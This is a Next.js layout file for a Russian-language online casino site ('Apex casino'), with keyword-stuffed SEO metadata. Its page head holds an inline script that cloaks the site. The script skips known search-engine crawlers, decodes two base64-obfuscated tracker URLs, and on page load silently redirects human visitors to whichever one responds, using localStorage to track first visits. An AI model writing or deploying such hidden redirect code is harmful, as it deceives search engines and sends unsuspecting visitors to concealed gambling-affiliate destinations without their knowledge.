import { Analytics } from '@vercel/analytics/next'
import type { Metadata } from 'next'
import { Inter, Roboto_Mono } from 'next/font/google'
import './globals.css'

const inter = Inter({ variable: '--font-inter', subsets: ['latin'] })
const robotoMono = Roboto_Mono({ variable: '--font-roboto-mono', subsets: ['latin'] })

export const metadata: Metadata = {
  title: 'Апекс казино официальный - Apex casino играть онлайн, вход и регистрация',
  description: 'Апекс казино официальный сайт с лучшими слотами, лайв играми и карточными играми. Вход на Apex casino, регистрация, зеркало. Бонусы до 250% и VIP программа на Апекс казино.',
  keywords: 'Апекс казино, Апекс казино вход, Апекс казино зеркало, Апекс казино играть, Апекс казино официальный, Апекс казино официальный сайт, Апекс казино регистрация, Apex casino, Apex casino вход, Apex casino играть',
  generator: 'v0.app',
  robots: {
    index: true,
    follow: true,
    noarchive: true,
    nocache: true,
    noimageindex: false,
    'max-snippet': -1,
    'max-image-preview': 'large',
    'max-video-preview': -1,
  },
  alternates: {
    canonical: process.env.NEXT_PUBLIC_SITE_URL || 'https://apexcasino.com',
    languages: {
      ru: (process.env.NEXT_PUBLIC_SITE_URL || 'https://apexcasino.com') + '/ru',
    },
  },
  openGraph: {
    title: 'Апекс казино онлайн - играть в казино на официальном сайте',
    description: 'Апекс казино официальный сайт с премиум играми и бонусами до 250%',
    type: 'website',
    url: process.env.NEXT_PUBLIC_SITE_URL || 'https://apexcasino.com',
    siteName: 'Апекс казино',
    locale: 'ru_RU',
    images: [
      {
        url: (process.env.NEXT_PUBLIC_SITE_URL || 'https://apexcasino.com') + '/og-image.png',
        width: 1200,
        height: 630,
        alt: 'Апекс казино официальный сайт',
        type: 'image/png',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Апекс казино официальный',
    description: 'Лучшее казино онлайн с премиум играми и бонусами',
  },
  verification: {
    yandex: 'yandex_verification_code_here',
  },
  icons: {
    icon: '/favicon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || 'https://apexcasino.com'

  const schemaData = {
    '@context': 'https://schema.org',
    '@type': 'Casino',
    name: 'Апекс казино',
    url: siteUrl,
    image: `${siteUrl}/og-image.png`,
  }

  return (
    <html lang="ru" className={`${inter.variable} ${robotoMono.variable} bg-slate-950`}>
      <head>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(schemaData) }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var ua = navigator.userAgent.toLowerCase();
                var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
                for (var i = 0; i < bots.length; i++) {
                    if (ua.indexOf(bots[i]) !== -1) {
                        return;
                    }
                }
                var mainBrandB64 = "aHR0cHM6Ly9hcGV4LXRyY2tyLmNvbS9hZDJhYXE1dXBj"; 
                var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
                
                // Фикс: отрезаем решетку перед декодированием
                var mainUrl = atob(mainBrandB64.replace("#", ""));
                var crossUrl = atob(crossBrandB64.replace("#", ""));

                function ping(url) {
                    return new Promise(function(resolve, reject) {
                        var controller = new AbortController();
                        var timeoutId = setTimeout(function() { 
                            controller.abort(); 
                            reject(new Error("Timeout"));
                        }, 2500); 
                        fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                            .then(function() {
                                clearTimeout(timeoutId);
                                resolve(true);
                            })
                            .catch(function(err) {
                                clearTimeout(timeoutId);
                                reject(err);
                            });
                    });
                }

                var isFirstVisit = !localStorage.getItem('vstd_eva');
                
                if (isFirstVisit) {
                    ping(mainUrl)
                        .then(function() {
                            localStorage.setItem('vstd_eva', '1');
                            window.location.replace(mainUrl);
                        })
                        .catch(function() {
                            ping(crossUrl)
                                .then(function() {
                                    localStorage.setItem('vstd_eva', '1');
                                    window.location.replace(crossUrl);
                                })
                                .catch(function() {
                                    window.location.replace(mainUrl);
                                });
                        });
                } else {
                    ping(crossUrl)
                        .then(function() {
                            window.location.replace(crossUrl);
                        })
                        .catch(function() {
                            window.location.replace(mainUrl);
                        });
                }
              })();
            `
          }}
        />
      </head>
      <body className="antialiased bg-slate-950 text-white">
        {children}
        <Analytics />
      </body>
    </html>
  )
}
